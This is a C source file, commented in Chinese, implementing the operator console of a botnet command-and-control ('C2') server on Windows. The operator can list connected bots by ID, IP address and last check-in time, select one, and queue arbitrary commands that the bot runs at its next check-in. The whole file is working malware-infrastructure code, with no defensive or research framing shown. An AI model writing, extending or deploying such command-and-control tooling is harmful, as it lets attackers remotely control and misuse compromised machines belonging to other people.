#include "c2_server.h"
#include <conio.h>
#include <string.h>
#include <process.h>




void show_bot_list() {
    EnterCriticalSection(&bot_mutex);
    
    printf("\n\n--- Active Bots ---\n");
    printf("%-5s%-40s%-20s%-25s\n", "IDX", "BOT ID", "IP ADDRESS", "LAST SEEN");
    printf("----------------------------------------------------------------\n");
    
    int active_count = 0;
    time_t now = time(NULL);
    
    for (int i = 0; i < MAX_BOTS; i++) {
        if (bot_list[i].bot_id[0] != '\0') {
            long seconds_ago = (long)difftime(now, bot_list[i].last_seen);
            
            // 新增精确时间格式化 
            char time_str[32];
            if (seconds_ago < 0) {
                snprintf(time_str, sizeof(time_str), "just now");
            } else if (seconds_ago < 60) {
                snprintf(time_str, sizeof(time_str), "%lds ago", seconds_ago);
            } else if (seconds_ago < 3600) {
                long minutes = seconds_ago / 60;
                long seconds = seconds_ago % 60;
                snprintf(time_str, sizeof(time_str), "%ldm %lds ago", minutes, seconds);
            } else if (seconds_ago < 86400) {
                long hours = seconds_ago / 3600;
                long minutes = (seconds_ago % 3600) / 60;
                snprintf(time_str, sizeof(time_str), "%ldh %ldm ago", hours, minutes);
            } else {
                long days = seconds_ago / 86400;
                snprintf(time_str, sizeof(time_str), "%ld days ago", days);
            }

            // 安全显示 Bot ID（使用格式化截断）
            char display_id[64] = {0}; // 初始化为0
            // 复制原始ID并确保以null结尾
            strncpy_s(display_id, sizeof(display_id), bot_list[i].bot_id, _TRUNCATE);

            printf("%-5d%-40.40s  %-20.20s%-25s\n", // 注意这里的空格位置 
                   active_count+1, 
                   display_id, 
                   bot_list[i].last_ip,
                   time_str);
            
            active_count++;
        }
    }
    
    if (active_count == 0) {
        printf("No active bots\n");
    } else {
        printf("\nTotal active bots: %d\n", active_count);
    }
    
    printf("\nCommands:\n");
    printf("  list  - Show this bot list\n");
    printf("  cmd   - Send command to bot\n");
    printf("  clear - Clear screen\n");
    printf("  exit  - Exit console (server keeps running)\n");
    printf("\n> ");
    
    LeaveCriticalSection(&bot_mutex);
}

void send_command_to_bot() {
    EnterCriticalSection(&bot_mutex);
    show_bot_list();
    LeaveCriticalSection(&bot_mutex);
    
    printf("\nEnter bot index (or 0 to cancel): ");
    
    char input[10];
    if (fgets(input, sizeof(input), stdin) == NULL) {
        // 处理输入错误或EOF
        return;
    }
    
    // 转换输入并验证有效性
    int bot_idx = atoi(input);
    if (bot_idx == 0) {
        printf("Operation cancelled\n");
        return;
    }
    bot_idx--; // 从索引1转换为0-based索引
    
    EnterCriticalSection(&bot_mutex);
    
    // 查找选择的bot
    int actual_index = -1;
    int count = 0;
    for (int i = 0; i < MAX_BOTS; i++) {
        if (bot_list[i].bot_id[0] != '\0') {
            if (count == bot_idx) {
                actual_index = i;
                break;
            }
            count++;
        }
    }
    
    if (actual_index == -1) {
        printf("\nInvalid bot selection!\n");
        LeaveCriticalSection(&bot_mutex);
        return;
    }
    
    char current_bot_id[64];
    strcpy_s(current_bot_id, sizeof(current_bot_id), bot_list[actual_index].bot_id);
    
    // 安全获取IP地址
    char bot_ip[INET_ADDRSTRLEN];
    strcpy_s(bot_ip, sizeof(bot_ip), bot_list[actual_index].last_ip);
    
    LeaveCriticalSection(&bot_mutex);
    
    // 进入Bot专属命令模式
    printf("\n<<< Command mode for Bot ID: %s (IP: %s) >>>\n", 
           current_bot_id, bot_ip);
    printf("Type commands below ('exit' to return, 'refresh' to update status)\n");
    printf("Commands will execute on next bot check-in\n");
    
    int command_count = 0;
    while (1) {
        printf("\n[Bot %s] > ", current_bot_id);
        
        char command[512];
        if (fgets(command, sizeof(command), stdin) == NULL) {
            break;
        }
        
        // 移除换行符
        size_t len = strcspn(command, "\n");
        if (len < sizeof(command)) {
            command[len] = '\0';
        }
        
        // 检查退出指令
        if (_stricmp(command, "exit") == 0) {
            break;
        }
        
        // 特殊命令：刷新Bot状态
        if (_stricmp(command, "refresh") == 0) {
            EnterCriticalSection(&bot_mutex);
            
            // 重新查找Bot是否仍然可用
            int bot_found = 0;
            for (int i = 0; i < MAX_BOTS; i++) {
                if (bot_list[i].bot_id[0] != '\0' && 
                    strcmp(bot_list[i].bot_id, current_bot_id) == 0) {
                    bot_found = 1;
                    // 更新显示信息
                    strcpy_s(bot_ip, sizeof(bot_ip), bot_list[i].last_ip);
                    long seconds_ago = (long)difftime(time(NULL), bot_list[i].last_seen);
                    
                    printf("\nBot status updated [Last seen: %ld seconds ago | IP: %s]", 
                           seconds_ago, bot_ip);
                    break;
                }
            }
            
            if (!bot_found) {
                printf("\n[!] Bot no longer available\n");
                LeaveCriticalSection(&bot_mutex);
                break;
            }
            
            // 显示最新列表
            show_bot_list();
            LeaveCriticalSection(&bot_mutex);
            continue;
        }
        
        // 空命令处理
        if (strlen(command) == 0) {
            printf("> Please enter a command or 'exit' to return\n");
            continue;
        }
        
        EnterCriticalSection(&bot_mutex);
        
        // 重新查找Bot（防止状态变化）
        int current_actual_index = -1;
        for (int i = 0; i < MAX_BOTS; i++) {
            if (bot_list[i].bot_id[0] != '\0' && 
                strcmp(bot_list[i].bot_id, current_bot_id) == 0) {
                current_actual_index = i;
                break;
            }
        }
        
        if (current_actual_index == -1) {
            printf("\n[!] Bot no longer available current_actual_index = -1 \n");
            LeaveCriticalSection(&bot_mutex);
            break;
        }
        
        // 存储命令
        strncpy_s(bot_list[current_actual_index].pending_command, 
                 sizeof(bot_list[current_actual_index].pending_command), 
                 command, _TRUNCATE);
        
        // 更新命令计数
        command_count++;
        
        printf("\n[+] Command #%d queued: %s", command_count, command);
        
        // 添加时间戳和显示命令摘要
        time_t now = time(NULL);
        char time_str[32];
        strftime(time_str, sizeof(time_str), "%H:%M:%S", localtime(&now));
        printf("\n > Queued at %s - Bot will execute on next check-in\n", time_str);
        
        LeaveCriticalSection(&bot_mutex);
    }
    
    printf("\nExited command mode for Bot %s\n", current_bot_id);
    printf("Total commands sent: %d\n", command_count);
}

void process_user_input() {
    char input[32];
    fgets(input, sizeof(input), stdin);
    input[strcspn(input, "\n")] = 0; // 移除换行符
    
    if (_stricmp(input, "list") == 0) {
        show_bot_list();
    } 
    else if (_stricmp(input, "cmd") == 0) {
        send_command_to_bot();
        printf("\n> ");
    } 
    else if (_stricmp(input, "clear") == 0) {
        system("cls");
        show_bot_list();
    } 
    else if (_stricmp(input, "exit") == 0) {
        printf("Console closed. Server continues running...\n");
    } 
    else {
        printf("Unknown command. Type 'list', 'cmd', 'clear' or 'exit'\n> ");
    }
}

unsigned __stdcall console_interface(void *arg) {
    printf("\n--- C2 Server Console ---\n");
    show_bot_list();
    
    while (1) {
        process_user_input();
    }
    
    return 0;
}

void start_console_interface() {
    HANDLE console_thread = (HANDLE)_beginthreadex(NULL, 0, console_interface, NULL, 0, NULL);
    if (console_thread) {
        CloseHandle(console_thread);
    }
}